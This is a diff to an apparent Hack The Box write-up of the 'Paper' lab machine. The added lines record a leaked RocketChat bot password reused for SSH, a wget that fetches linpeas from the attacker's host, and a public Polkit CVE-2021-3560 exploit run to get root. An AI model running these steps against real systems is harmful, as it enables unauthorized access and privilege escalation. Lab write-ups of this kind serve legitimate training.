@@ -1,3 +1,6 @@
+https://www.hackthebox.com/achievement/machine/998467/432
+
+
 # ENUMERATION
 
 ### NMAP
@@ -466,10 +469,87 @@ export BIND_ADDRESS=127.0.0.1
 ```console
 export ROCKETCHAT_URL='http://127.0.0.1:48320'
 export ROCKETCHAT_USER=recyclops
-export ROCKETCHAT_PASSWORD=chat.
+export ROCKETCHAT_PASSWORD=Queenofblad3s!23
 export ROCKETCHAT_USESSL=false
 export RESPOND_TO_DM=true
-export RESPOND_TO_EDITED=true
+export RESPOND_TO_EDITED=truetrue
 export PORT=8000
 export BIND_ADDRESS=127.0.0.1
 ```
+I wasn't able to SSH into recoclops account, but the dwight is the owner of the folder, lets see if he shares the same password. 
+
+There is the first flag and nothing really to be seen so far. So lets run linpeas.
+
+### Linpeas
+
+```console
+dwight@paper ~]$ wget 10.10.14.5:8080/linpeas.sh   
+--2022-04-08 01:58:01--  http://10.10.14.5:8080/linpeas.sh
+Connecting to 10.10.14.5:8080... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 765823 (748K) [text/x-sh]
+Saving to: ‘linpeas.sh’
+
+linpeas.sh                100%[====================================>] 747.87K  2.76MB/s    in 0.3s    
+
+2022-04-08 01:58:02 (2.76 MB/s) - ‘linpeas.sh’ saved [765823/765823]
+
+[dwight@paper ~]$ ls
+bot_restart.sh  hubot  linpeas.sh  sales  user.txt
+[dwight@paper ~]$ ./liinpeas.sh
+-bash: ./liinpeas.sh: No such file or directory
+[dwight@paper ~]$ ./linpeas.sh
+-bash: ./linpeas.sh: Permission denied
+[dwight@paper ~]$ chmod +x linpeas.sh
+[dwight@paper ~]$ ./linpeas.sh
+```
+
+```console
+                                       ╚════════════════════╝                                                                                                                                                                             
+╔══════════╣ Operative system
+╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#kernel-exploits                                                                                                                                                              
+Linux version 4.18.0-348.7.1.el8_5.x86_64 (mockbuild@kbuilder.bsys.centos.org) (gcc version 8.5.0 20210514 (Red Hat 8.5.0-4) (GCC)) #1 SMP Wed Dec 22 13:25:12 UTC 2021                                                                    
+lsb_release Not Found
+                                                                                                                                                                                                                                           
+╔══════════╣ Sudo version
+╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-version                                                                                                                                                                 
+Sudo version 1.8.29                                                                                                                                                                                                                        
+
+Vulnerable to CVE-2021-3560
+
+
+╔══════════╣ PATH
+╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-path-abuses                                                                                                                                                         
+/home/dwight/.local/bin:/home/dwight/bin:/usr/local/bin:/usr/bin:/usr/local/sbin:/usr/sbin                                                                                                                                                 
+New path exported: /home/dwight/.local/bin:/home/dwight/bin:/usr/local/bin:/usr/bin:/usr/local/sbin:/usr/sbin:/sbin:/bin
+```
+
+# Privledge Escalation
+
+### Polkit 0.105-26 0.117-2 - Local Privilege Escalation
+
+https://github.com/Almorabea/Polkit-exploit/blob/main/CVE-2021-3560.py
+
+creating the exploit, I copy pasted it into nano through ssh
+
+```console
+[dwight@paper ~]$ nano exploit.py
+[dwight@paper ~]$ ./exploit.py
+-bash: ./exploit.py: Permission denied
+[dwight@paper ~]$ chmod +x exploit.py 
+[dwight@paper ~]$ ./exploit.py
+```
+```console
+[root@paper dwight]# 
+[root@paper dwight]# 
+[root@paper dwight]# ls
+bot_restart.sh  exploit.py  hubot  linpeas.sh  linpeas.txt  sales  user.txt
+[root@paper dwight]# cd root
+bash: cd: root: No such file or directory
+[root@paper dwight]# cd /root
+[root@paper ~]# ls
+anaconda-ks.cfg  initial-setup-ks.cfg  root.txt
+[root@paper ~]# 
+```
+
+
